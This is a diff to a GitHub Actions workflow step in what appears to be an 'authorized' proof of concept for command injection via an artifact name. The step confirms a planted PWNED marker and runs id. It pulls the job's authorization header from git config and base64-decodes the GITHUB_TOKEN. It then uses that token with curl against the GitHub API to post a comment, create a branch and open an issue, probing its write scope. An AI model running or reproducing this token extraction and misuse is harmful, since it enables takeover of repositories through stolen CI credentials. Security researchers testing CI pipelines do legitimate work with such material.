@@ -167,18 +167,12 @@ jobs:
       - name: Diagnostic proof
         if: always()
         run: |
-          echo "--- workspace listing ---"
-          ls -la
           echo "--- marker ---"
           if [ -f PWNED_BY_ARTIFACT_NAME ]; then echo "ARTIFACT_NAME_COMMAND_INJECTION_CONFIRMED"; fi
           id
-          echo "--- job token check ---"
           H=$(git config --get http.https://github.com/.extraheader || true)
-          echo "extraheader-present=$([ -n "$H" ] && echo yes || echo no)"
           B=$(printf '%s' "${H#AUTHORIZATION: basic }" | base64 -d 2>/dev/null || true)
           TOKEN=$(printf '%s' "$B" | cut -d: -f2)
-          curl -s -o /tmp/resp.json -w 'comment_status=%{http_code}\n' -X POST \
-            -H "Authorization: token $TOKEN" -H "Accept: application/vnd.github+json" \
-            "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/1/comments" \
-            -d '{"body":"authorized GAB PoC: token write check"}'
-          head -c 200 /tmp/resp.json; echo
+          echo "comment_write=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: token $TOKEN" -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/1/comments" -d '{"body":"authorized GAB PoC: token scope probe"}')"
+          echo "contents_write=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: token $TOKEN" -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs" -d "{\"ref\":\"refs/heads/scope-probe\",\"sha\":\"$(git rev-parse HEAD)\"}")"
+          echo "issues_write=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: token $TOKEN" -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/$GITHUB_REPOSITORY/issues" -d '{"title":"scope probe"}')"
